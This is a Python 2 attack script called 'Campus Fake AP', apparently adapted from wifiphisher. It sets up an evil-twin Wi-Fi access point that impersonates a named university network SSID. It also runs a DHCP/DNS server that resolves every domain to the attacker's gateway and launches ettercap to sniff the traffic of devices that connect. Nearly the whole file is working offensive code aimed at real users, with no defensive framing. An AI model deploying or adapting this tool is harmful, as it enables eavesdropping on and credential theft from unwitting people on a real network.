#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from subprocess import check_output
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

POST_VALUE_PREFIX = "wfphshr"
NETWORK_IP = "10.0.0.0"
NETWORK_MASK = "255.255.255.0"
NETWORK_GW_IP = "10.0.0.1"
DHCP_LEASE = "10.0.0.2,10.0.0.100,12h"

DN = open(os.devnull, 'w')

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray
T = '\033[93m'  # tan


def shutdown():
    """
    Shutdowns program.
    """
    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('pkill airbase-ng')
    os.system('pkill dnsmasq')
    os.system('pkill hostapd')
    if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
        os.remove('/tmp/wifiphisher-webserver.tmp')
    if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
        os.remove('/tmp/wifiphisher-jammer.tmp')
    if os.path.isfile('/tmp/hostapd.conf'):
        os.remove('/tmp/hostapd.conf')
    reset_interfaces()
    print '\n[' + R + '!' + W + '] Closing'
    sys.exit(0)


def get_interfaces():
    interfaces = {"monitor": [], "managed": [], "all": []}
    proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0:
            continue  # Isn't an empty string
        if line[0] != ' ':  # Doesn't start with space
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search:  # Isn't wired
                iface = line[:line.find(' ')]  # is the interface
                if 'Mode:Monitor' in line:
                    interfaces["monitor"].append(iface)
                elif 'IEEE 802.11' in line:
                    interfaces["managed"].append(iface)
                interfaces["all"].append(iface)
    return interfaces


def reset_interfaces():
    monitors = get_interfaces()["monitor"]
    for m in monitors:
        if 'mon' in m:
            Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN)
        else:
            Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN)
            Popen(['iwconfig', m, 'mode', 'managed'], stdout=DN, stderr=DN)
            Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)


def start_ap(mon_iface, channel, essid, args=None):
    print '[' + T + '*' + W + '] Starting the fake access point...'
    config = (
        'interface=%s\n'
        'driver=nl80211\n'
        'ssid=%s\n'
        'hw_mode=g\n'
        'channel=%s\n'
        'macaddr_acl=0\n'
        'ignore_broadcast_ssid=0\n'
    )
    with open('/tmp/hostapd.conf', 'w') as dhcpconf:
        dhcpconf.write(config % (mon_iface, essid, channel))

    # 这里容易出错，我要看到它的输出
    # Popen(['hostapd', '/tmp/hostapd.conf'], stdout=DN, stderr=DN)
    os.system('hostapd /tmp/hostapd.conf &')

    try:
        time.sleep(6)  # Copied from Pwnstar which said it was necessary?
    except KeyboardInterrupt:
        shutdown()


def dhcp_conf(interface):
    config = (
        'no-resolv\n'
        'interface=%s\n'
        'dhcp-range=%s\n'
        'address=/#/%s'
    )

    with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
        dhcpconf.write(config % (interface, DHCP_LEASE, NETWORK_GW_IP))
    return '/tmp/dhcpd.conf'


def dhcp(dhcpconf, mon_iface):
    os.system('echo > /var/lib/misc/dnsmasq.leases')
    dhcp = Popen(['dnsmasq', '-C', dhcpconf], stdout=PIPE, stderr=DN)
    Popen(['ifconfig', str(mon_iface), 'mtu', '1400'], stdout=DN, stderr=DN)
    Popen(
        ['ifconfig', str(mon_iface), 'up', NETWORK_GW_IP,
         'netmask', NETWORK_MASK
         ],
        stdout=DN,
        stderr=DN
    )
    # Make sure that we have set the network properly.
    proc = check_output(['ifconfig', str(mon_iface)])
    if NETWORK_GW_IP not in proc:
        return False
    time.sleep(.5)  # Give it some time to avoid "SIOCADDRT: Network is unreachable"
    os.system(
        ('route add -net %s netmask %s gw %s' %
         (NETWORK_IP, NETWORK_MASK, NETWORK_GW_IP))
    )
    return True


def start_mode(interface, mode="monitor"):
    print ('[' + G + '+' + W + '] Starting ' + mode + ' mode off '
           + G + interface + W)
    try:
        os.system('ifconfig %s down' % interface)
        os.system('iwconfig %s mode %s' % (interface, mode))
        os.system('ifconfig %s up' % interface)
        return interface
    except Exception:
        sys.exit('[' + R + '-' + W + '] Could not start %s mode' % mode)


if __name__ == "__main__":

    print (B + '   [---]           Campus Fake AP            [---]')
    print (B + '   [---]         Created by: Xyntax          [---]')
    print (B + '   [---]            Version: 0.9             [---]')
    print (B + '   [---]    Github: noScript/CampusFakeAp    [---]')
    print (B + '   [---]     Follow me on Github: Xyntax     [---]')


    # Parse args
    # args = parse_args()
    # Are you root?
    if os.geteuid():
        sys.exit('[' + R + '-' + W + '] Please run as root')
    # Get hostapd if needed
    # get_hostapd()
    os.system('sudo nmcli radio wifi off')
    os.system('rfkill unblock all')

    Popen(
        ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
        stdout=DN,
        stderr=PIPE
    )

    print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'

    time.sleep(3)

    channel = '6'
    essid = 'web.wlan.bjtu'
    ap_iface = 'wlan0'


    # os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    # os.system('iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE')
    # os.system('iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT')
    # os.system('iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356')

    # Start AP
    mon_iface = '00:c0:ca:42:22:03'
    start_ap(ap_iface, channel, essid)

    dhcpconf = dhcp_conf(ap_iface)
    if not dhcp(dhcpconf, ap_iface):
        print('[' + G + '+' + W +
              '] Could not set IP address on %s!' % ap_iface)
        shutdown()
    os.system('clear')
    print ('[' + T + '*' + W + '] ' + T +
           essid + W + ' set up on channel ' +
           T + channel + W + ' via ' + T + mon_iface +
           W + ' on ' + T + str(ap_iface) + W)

    # Main loop.
    try:
        os.system('ettercap -puTqi ' + ap_iface)
    except KeyboardInterrupt:
        shutdown()
